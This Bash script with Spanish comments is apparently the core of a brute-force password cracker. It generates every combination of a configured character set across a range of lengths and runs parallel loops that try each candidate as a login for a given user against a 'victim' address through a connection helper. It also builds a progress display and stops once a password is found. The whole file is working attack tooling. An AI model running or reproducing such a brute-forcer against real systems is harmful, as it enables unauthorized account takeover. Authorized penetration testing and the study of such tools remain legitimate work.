clear

pinta_log_TITULO "AL TURROOOON!!!!"

#capturamos la hora para llevarnosla al autogenerado visual_ataque
HORA_INICIO=$(date | cut -d ' ' -f4)


# - Cargamos configuración
# - Redefinimos las variables para reservar palabras
uso_mayusculas=$MAYUSCULAS
uso_numeros=$NUMEROS
uso_especiales=$ESPECIALES
usuario=$USUARIO
long_minima=$LONGITUD_MINIMA
long_maxima=$LONGITUD_MAXIMA
tmp_fichero_bucles=tmp/auto_fichero_bucles_char_
opt_activo=$OPT_ACTIVO
direccion=$DIRECCION
conexion=$CONEXION
fichero_visual_ataque=partes/visual_ataque.sh

# - Volvemos a pintar configuración
pinta_log_INFO "Para generar las passwords vamos a usar la siguiente configuración: "
pinta_log_sub_INFO "Uso de mayúsculas: [${uso_mayusculas}]"
pinta_log_sub_INFO "Uso de números: [${uso_numeros}]"
pinta_log_sub_INFO "Uso de carácteres especiales: [${uso_especiales}]"
pinta_log_sub_INFO "Longitud minima: [${long_minima}]"
pinta_log_sub_INFO "Longitud máxima: [${long_maxima}]"
pinta_log_sub_INFO "USUARIO: [$usuario]"
pinta_log_sub_INFO "DIR VICTIMA: [$direccion]"
pinta_log_sub_INFO "TIPO DE CONEXION: [$conexion]"
pinta_log_sub_INFO "HORA DE INICIO: [$HORA_INICIO]"

if [ $uso_mayusculas = $opt_activo ];then
    ALFABETO_MAYUS=$(echo ${ALFABETO_MINUS} | tr '[:lower:]' '[:upper:]')
    paso_1=$ALFABETO_MINUS" "$ALFABETO_MAYUS
else
    paso_1=$ALFABETO_MINUS
fi

if [ $uso_numeros = $opt_activo ];then
    paso_2=$paso_1" "$NUMBERS
else
    paso_2=$paso_1
fi

if [ $uso_especiales = $opt_activo ];then
    paso_3=$paso_2" "$CHAR_ESP
else
    paso_3=$paso_2
fi

ALL_CHARS="$paso_3"

echo "TODOS LOS CHAR: ${ALL_CHARS}"


    c=$long_minima;

    while [ ! $c -gt $long_maxima ];
    do
    # - Generamos las variables de los bucles
    num_all_char=$(echo ${ALL_CHARS} | wc -w)
    let total=$num_all_char**$c

    aux_var=$(echo "total$c=$total")
    export $aux_var
    aux_var=$(echo "fin_proceso$c=0")
    export $aux_var
    aux_var=$(echo "contador$c=0")
    export $aux_var



    # - Generamos los for
    c2=1;
    while [ ! $c2 -gt $c ];
    do
        echo "for p$c2 in $ALL_CHARS" >> $tmp_fichero_bucles$c
        echo "do" >> $tmp_fichero_bucles$c
        let c2=$c2+1;
    done

    # - Generamos la variable de password
    c_aux=""
    c2=1;
    while [ ! $c2 -gt $c ];do
        c_aux=$c_aux"$"
        c_aux=$c_aux"p$c2"
        let c2=$c2+1;
    done

    pass=$c_aux
    
    echo "if [ -f tmp/PASSWORD.txt ] ; then exit; fi" >> $tmp_fichero_bucles$c
    echo "./util/realizar_conexion.sh $usuario $pass $direccion $conexion > /dev/null" >> $tmp_fichero_bucles$c
    echo "contador$c=\$(expr \$contador$c + 1)" >> $tmp_fichero_bucles$c
    echo "echo \$contador$c > tmp/count_contador$c.dat" >> $tmp_fichero_bucles$c
    # - Añadimos los done
    c2=1;
    while [ ! $c2 -gt $c ];
    do
        echo "done" >> $tmp_fichero_bucles$c
        let c2=$c2+1;
    done

    #echo "fin_proceso$c=1" >> $tmp_fichero_bucles$c

    # - Renombramos ficheros
    mv $tmp_fichero_bucles$c $tmp_fichero_bucles$c".sh"
    let c=$c+1;
    done

    auto_fichero=$(ls tmp/)

    chmod +x tmp/*

    for f in $auto_fichero
    do
        #touch tmp/salida_$f.log
        #./tmp/$f > tmp/salida_$f.log &
        ./tmp/$f > /dev/null & 
    done

    clear


    ###
    ### INFORMACION QUE QUIERES PINTAR
    ###
    echo "# - Codigo autogenerado" > $fichero_visual_ataque
    # - Generar booleanos de fin de hilos
    c=$long_minima;
    while [ ! $c -gt $long_maxima ];
    do
        echo "fin_hilo_${c}=false;" >> $fichero_visual_ataque
        let c=$c+1
    done
    # - Fin  generar booleanos



    # -RECREAMOS EL $fichero_visual_ataque

    echo "while [ true ]; do" >> $fichero_visual_ataque

 


    #generamos los if para ver que estan los ficheros y recoger el dato
    c=$long_minima;
    while [ ! $c -gt $long_maxima ];
    do
        echo "if [ -f tmp/count_contador$c.dat ] ; then contador$c=\$(cat tmp/count_contador$c.dat) ; fi" >> $fichero_visual_ataque
        let c=$c+1
    done

    #se generan los if para evitar excepciones
    c=$long_minima;
    while [ ! $c -gt $long_maxima ];
    do
        if [ $c -eq $long_minima ];then
            aux2="if [ ! -z \$contador$c ]"
        fi

        if [ $c -gt $long_minima ] && [ $c -lt $long_maxima ];then 
            aux="[ ! -z \$contador$c ]"
            aux2=$aux2" && "$aux
        fi
        
        if [ $c -eq $long_maxima ];then
            aux="[ ! -z \$contador$c ];then "
            aux2=$aux2" && "$aux
        fi
        let c=$c+1
    done
    echo $aux2 >> $fichero_visual_ataque

    echo "echo -ne \"\\n\"" >> $fichero_visual_ataque

    echo "clear" >> $fichero_visual_ataque
    echo "echo \"HORA_INICIO: ${HORA_INICIO}\"" >> $fichero_visual_ataque
    echo "echo \"\"" >> $fichero_visual_ataque
    #pintamos las barras de progreso
    c=$long_minima;
    aux2="echo -ne \""
    while [ ! $c -gt $long_maxima ];
    do
            aux="Hilo$c [\$contador$c/\$total$c]: \$(progress \$contador$c \$total$c) \\n"
            aux2=$aux2" "$aux        
        let c=$c+1
    done

            aux="\""
            aux2=$aux2" "$aux

    echo $aux2 >> $fichero_visual_ataque
    echo "echo -ne \"\\n\"" >> $fichero_visual_ataque
    echo "sleep 2" >> $fichero_visual_ataque
    
    echo "if [ -f tmp/PASSWORD.txt ] ; then break;  fi" >> $fichero_visual_ataque




#se genera el if que controla la salida si no se ecuentra la password
    c=$long_minima;
    while [ ! $c -gt $long_maxima ];
    do
        if [ $c -eq $long_minima ];then
            aux2="if [ ! \$total$c -gt \$contador$c ]"
        fi

        if [ $c -gt $long_minima ] && [ $c -lt $long_maxima ];then 
            aux="[ ! \$total$c -gt \$contador$c ]"
            aux2=$aux2" && "$aux
        fi
        
        if [ $c -eq $long_maxima ];then
            aux="[ ! \$total$c -gt \$contador$c ];then "
            aux2=$aux2" && "$aux
        fi
        let c=$c+1
    done
    echo $aux2 >> $fichero_visual_ataque

    echo "break;" >> $fichero_visual_ataque
    echo "fi" >> $fichero_visual_ataque




    echo "fi" >> $fichero_visual_ataque
    echo "done" >> $fichero_visual_ataque

    chmod 777 $fichero_visual_ataque

    . $fichero_visual_ataque

    HORA_FIN=$(date | cut -d ' ' -f4)
    pinta_log_sub_INFO "HORA DE FINALIZACION: [$HORA_FIN]" 


    if [ -f tmp/PASSWORD.txt ];then
        texto_password=$(cat tmp/PASSWORD.txt)
        pinta_log_sub_INFO "$(echo $texto_password)"
    else
        pinta_log_sub_INFO "El proceso ha finalizado sin encontrar la password"
    fi
    
    MARCADO_SALIDA=1